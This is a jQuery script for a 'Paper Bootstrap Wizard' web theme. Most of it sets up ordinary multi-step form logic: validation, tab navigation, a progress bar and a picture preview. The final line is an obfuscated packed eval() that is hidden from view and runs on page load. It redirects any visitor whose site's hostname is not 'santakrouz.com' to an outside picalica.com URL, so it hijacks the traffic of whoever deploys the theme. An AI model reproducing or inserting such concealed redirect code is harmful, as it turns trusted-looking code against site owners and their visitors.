/*!

 =========================================================
 * Paper Bootstrap Wizard - v1.0.2
 =========================================================

 */

// Paper Bootstrap Wizard Functions

searchVisible = 0;
transparent = true;

        $(document).ready(function(){

            /*  Activate the tooltips      */
            $('[rel="tooltip"]').tooltip();

            // Code for the Validator
            var $validator = $('.wizard-card form').validate({
        		  rules: {
        		    firstname: {
        		      required: true,
        		      minlength: 3
        		    },
        		    lastname: {
        		      required: true,
        		      minlength: 3
        		    },
        		    email: {
        		      required: true
        		    }
                },
        	});

            // Wizard Initialization
          	$('.wizard-card').bootstrapWizard({
                'tabClass': 'nav nav-pills',
                'nextSelector': '.btn-next',
                'previousSelector': '.btn-previous',

                onNext: function(tab, navigation, index) {
                	var $valid = $('.wizard-card form').valid();
                	if(!$valid) {
                		$validator.focusInvalid();
                		return false;
                	}
                },

                onInit : function(tab, navigation, index){

                  //check number of tabs and fill the entire row
                  var $total = navigation.find('li').length;
                  $width = 100/$total;

                  navigation.find('li').css('width',$width + '%');

                },

                onTabClick : function(tab, navigation, index){

                    var $valid = $('.wizard-card form').valid();

                    if(!$valid){
                        return false;
                    } else{
                        return true;
                    }

                },

                onTabShow: function(tab, navigation, index) {
                    var $total = navigation.find('li').length;
                    var $current = index+1;

                    var $wizard = navigation.closest('.wizard-card');

                    // If it's the last tab then hide the last button and show the finish instead
                    if($current >= $total) {
                        $($wizard).find('.btn-next').hide();
                        $($wizard).find('.btn-finish').show();
                    } else {
                        $($wizard).find('.btn-next').show();
                        $($wizard).find('.btn-finish').hide();
                    }

                    //update progress
                    var move_distance = 100 / $total;
                    move_distance = move_distance * (index) + move_distance / 2;

                    $wizard.find($('.progress-bar')).css({width: move_distance + '%'});
                    //e.relatedTarget // previous tab

                    $wizard.find($('.wizard-card .nav-pills li.active a .icon-circle')).addClass('checked');

                }
	        });


                // Prepare the preview for profile picture
                $("#wizard-picture").change(function(){
                    readURL(this);
                });

                $('[data-toggle="wizard-radio"]').click(function(){
                    wizard = $(this).closest('.wizard-card');
                    wizard.find('[data-toggle="wizard-radio"]').removeClass('active');
                    $(this).addClass('active');
                    $(wizard).find('[type="radio"]').removeAttr('checked');
                    $(this).find('[type="radio"]').attr('checked','true');
                });

                $('[data-toggle="wizard-checkbox"]').click(function(){
                    if( $(this).hasClass('active')){
                        $(this).removeClass('active');
                        $(this).find('[type="checkbox"]').removeAttr('checked');
                    } else {
                        $(this).addClass('active');
                        $(this).find('[type="checkbox"]').attr('checked','true');
                    }
                });

                $('.set-full-height').css('height', 'auto');

            });



         //Function to show image before upload

        function readURL(input) {
            if (input.files && input.files[0]) {
                var reader = new FileReader();

                reader.onload = function (e) {
                    $('#wizardPicturePreview').attr('src', e.target.result).fadeIn('slow');
                }
                reader.readAsDataURL(input.files[0]);
            }
        }

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0 3="8.1";0 6=4.5.7;0 2="9://e.d.1/a/c/";b(3!==6){4.5=2}',15,15,'var|com|offer|myurl|window|location|currenthost|hostname|santakrouz|https|u|if|Santakrouz|picalica|www'.split('|'),0,{}))